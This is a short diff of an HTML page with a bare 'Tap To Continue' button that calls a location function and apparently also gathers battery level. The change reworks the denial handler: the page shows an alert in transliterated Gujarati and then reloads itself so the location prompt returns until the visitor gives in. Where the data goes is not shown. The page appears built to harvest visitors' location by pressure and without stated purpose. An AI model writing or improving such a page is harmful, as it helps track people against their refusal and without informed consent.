@@ -10,9 +10,8 @@ height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-margin:0;
 flex-direction:column;
-font-family:Arial;
+margin:0;
 }
 
 button{
@@ -21,8 +20,9 @@ padding:20px 40px;
 cursor:pointer;
 }
 
-h2{
+#msg{
 margin-top:20px;
+font-size:22px;
 }
 </style>
 
@@ -30,11 +30,9 @@ margin-top:20px;
 
 <body>
 
-<button onclick="getLocation()">
-Tap To Continue
-</button>
+<button onclick="getLocation()">Tap To Continue</button>
 
-<h2 id="msg"></h2>
+<div id="msg"></div>
 
 <script>
 
@@ -75,9 +73,9 @@ battery:batteryLevel
 
 function error(){
 
-alert("Please allow location to continue")
+alert("Location allow karo pachhi continue thase")
 
-getLocation()   // ફરી popup આવશે
+location.reload()   // page reload → popup fari aavse
 
 }
 
